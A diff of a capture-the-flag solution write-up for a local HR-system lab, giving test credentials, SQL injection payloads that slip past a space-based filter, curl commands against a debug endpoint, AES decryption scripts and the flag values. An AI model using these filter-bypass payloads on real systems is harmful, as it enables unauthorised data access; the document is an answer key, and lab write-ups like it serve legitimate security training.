@@ -1,103 +1,135 @@
-# CTF 3: HR System - Multi-Stage Challenge Solution
-
-## Overview
-This CTF involves 4 flags total:
-1. **Flag 1**: Your personal flag (easily accessible)
-2. **Flag 2**: Hidden decryption key (found in source code)
-3. **Flag 3**: Encrypted flag (revealed via SQL injection)
-4. **Flag 4**: Final flag (decrypt Flag 3 using Flag 2)
+# CTF 3: HR System Solution
 
 ## Credentials
-Login with one of these accounts:
 - `abcd12` / `RVIFLBfM`
 - `efgh34` / `bcgxO1ZkSle`
 - `ijkl56` / `kH0g5imYtZ`
 
-## Stage 1: Get Your Personal Flag
+---
 
-1. Login to the HR System at http://localhost:5174
-2. Navigate to the Flag page (usually accessible from the dashboard)
-3. Your personal flag is displayed: `durham-hr{your_unique_flag}`
+## Flag 1: Path Traversal
 
-## Stage 2: Find the Encryption Key
+1. Login at http://localhost:5174
+2. Inspect Dashboard page source (Ctrl+U or View Source)
+3. Find HTML comment: `<!-- TODO: Fix broken admin link - /admin/../../flag should redirect properly -->`
+4. Navigate to: `http://localhost:5174/flag`
 
-The dashboard shows 4 employees but only 3 are visible in the employee list. Something is hidden!
+**Flag:** `durham-hr{w3lc0m3_t0_hr_syst3m}`
 
-**Hunt for clues in the frontend source code:**
+---
 
-1. Open browser DevTools (F12) → Sources tab
-2. Look through JavaScript/TypeScript files
-3. Find `legacyAuth.ts` or similar legacy files
-4. The key is hidden in a comment:
+## Flag 2: Source Code Discovery
 
-```
-Key: CTF_2026_SECRET_KEY_XJ9K2L
-```
+1. Open DevTools (F12) → Sources tab
+2. Navigate to: `src/utils/legacyAuth.ts`
+3. Find key in comments: `CTF_2026_SECRET_KEY_XJ9K2L`
 
-**Alternative method**: View page source and search for "legacy" or "AES" or "key"
+**Flag 2 (Decryption Key):** `CTF_2026_SECRET_KEY_XJ9K2L`
 
-## Stage 3: SQL Injection to Reveal Hidden Employee
+---
 
-The employee search has a "security" filter, but it's bypassable!
+## Flag 3: SQL Injection
 
-**The Filter:**
-- Blocks: `' OR 1=1--` (spaces around OR are detected)
-- Allows: `'OR...` (no space after the quote)
+The employee search filters basic injection like `' OR 1=1--` but misses no-space variants.
 
-**The Bypass Payload:**
-```
-'OR u.username='flag12'--
-```
+**Blocked:** `' OR 1=1--` (space after quote)
 
-**How to execute:**
+**Working Payloads:**
+- `'OR 1=1--` (no space after quote)
+- `'/**/OR/**/1=1--` (comment-based)
 
-Using the API directly:
-```bash
-# Get token first
-TOKEN=$(curl -s -X POST http://localhost:8004/api/auth/login \
-  -H "Content-Type: application/json" \
-  -d '{"username":"abcd12","password":"RVIFLBfM"}' | jq -r '.token')
+**Steps:**
 
-# Execute SQL injection
-curl -s "http://localhost:8004/api/employees?search=%27OR%20u.username%3D%27flag12%27--" \
-  -H "Authorization: Bearer $TOKEN"
-```
+1. Go to Employees page
+2. Enter payload in search: `'OR 1=1--`
+3. Returns all 4 employees including FLAG012:
 
-**What you'll find:**
 ```json
 {
   "employee_id": "FLAG012",
-  "position": "System Auditor",
+  "username": "flag12",
   "notes": "AES-256-CBC encrypted data: +DUi/1MfXD1MDdwdvzE2YA==:uj1qPXtZow7ovD1UgKZT6PAmDWWZScvFnJqgpxY4bsWeApZZ7pZY4GN64Fa1SBj6 (hint: check legacy code for the key)"
 }
 ```
 
-## Stage 4: Decrypt the Final Flag
+---
 
-Now you have:
-- **Encrypted data**: `+DUi/1MfXD1MDdwdvzE2YA==:uj1qPXtZow7ovD1UgKZT6PAmDWWZScvFnJqgpxY4bsWeApZZ7pZY4GN64Fa1SBj6`
-- **Key**: `CTF_2026_SECRET_KEY_XJ9K2L`
-- **Algorithm**: AES-256-CBC
+## Flag 4: API Exploitation + Decryption
 
-**Decryption Script (Node.js):**
+### Step 1: Get Full Credentials
+
+**Hint in:** `frontend/src/api/client.ts` shows debug endpoint
+
+**Exploit:**
+```bash
+# Get token
+TOKEN=$(curl -s -X POST http://127.0.0.1:8004/api/auth/login \
+  -H "Content-Type: application/json" \
+  -d '{"username":"abcd12","password":"RVIFLBfM"}' \
+  | grep -o '"token":"[^"]*"' | cut -d'"' -f4)
+
+# Query debug endpoint
+curl "http://127.0.0.1:8004/api/debug/config?user=flag12" \
+  -H "Authorization: Bearer $TOKEN"
+```
+
+**Response:**
+```json
+{
+  "user": "flag12",
+  "config": {
+    "notes": "AES-256-CBC encrypted data: +DUi/1MfXD1MDdwdvzE2YA==:uj1qPXtZow7ovD1UgKZT6PAmDWWZScvFnJqgpxY4bsWeApZZ7pZY4GN64Fa1SBj6 (hint: check legacy code for the key)"
+  }
+}
+```
+
+### Step 2: Decrypt Final Flag
+
+**Node.js:**
 ```javascript
 const crypto = require('crypto');
 
-const encryptedData = '+DUi/1MfXD1MDdwdvzE2YA==:uj1qPXtZow7ovD1UgKZT6PAmDWWZScvFnJqgpxY4bsWeApZZ7pZY4GN64Fa1SBj6';
-const passphrase = 'CTF_2026_SECRET_KEY_XJ9K2L';
+const encrypted = '+DUi/1MfXD1MDdwdvzE2YA==:uj1qPXtZow7ovD1UgKZT6PAmDWWZScvFnJqgpxY4bsWeApZZ7pZY4GN64Fa1SBj6';
+const key_passphrase = 'CTF_2026_SECRET_KEY_XJ9K2L';
 
-const [ivBase64, ciphertextBase64] = encryptedData.split(':');
+const [ivBase64, ciphertext] = encrypted.split(':');
+const key = crypto.createHash('sha256').update(key_passphrase).digest();
 const iv = Buffer.from(ivBase64, 'base64');
-const ciphertext = Buffer.from(ciphertextBase64, 'base64');
-
-// Derive key using SHA256
-const key = crypto.createHash('sha256').update(passphrase).digest();
-
 const decipher = crypto.createDecipheriv('aes-256-cbc', key, iv);
-let decrypted = decipher.update(ciphertext, undefined, 'utf8');
-decrypted += decipher.final('utf8');
 
-console.log('Decrypted flag:', decrypted);
+let decrypted = decipher.update(ciphertext, 'base64', 'utf8');
+decrypted += decipher.final('utf8');
+console.log(decrypted);
+```
+
+**Python:**
+```python
+from Crypto.Cipher import AES
+import hashlib, base64
+
+encrypted = '+DUi/1MfXD1MDdwdvzE2YA==:uj1qPXtZow7ovD1UgKZT6PAmDWWZScvFnJqgpxY4bsWeApZZ7pZY4GN64Fa1SBj6'
+key_passphrase = 'CTF_2026_SECRET_KEY_XJ9K2L'
+
+iv_b64, ciphertext = encrypted.split(':')
+key = hashlib.sha256(key_passphrase.encode()).digest()
+iv = base64.b64decode(iv_b64)
+cipher = AES.new(key, AES.MODE_CBC, iv)
+decrypted = cipher.decrypt(base64.b64decode(ciphertext))
+print(decrypted.decode('utf-8').rstrip('\x00'))
+```
+
+**Flag 4:** `durham-hr{h1dd3n_3mpl0y33_4dv4nc3d_sql1_m4st3r}`
+
+---
+
+## Summary
+
+| Flag | Technique | Result |
+|------|-----------|--------|
+| 1 | Path traversal | `durham-hr{w3lc0m3_t0_hr_syst3m}` |
+| 2 | Source code inspection | `CTF_2026_SECRET_KEY_XJ9K2L` |
+| 3 | SQL injection | Found FLAG012 + encrypted data |
+| 4 | Debug API + AES decrypt | `durham-hr{h1dd3n_3mpl0y33_4dv4nc3d_sql1_m4st3r}` |
 ```
 
 **Decryption Script (Python):**
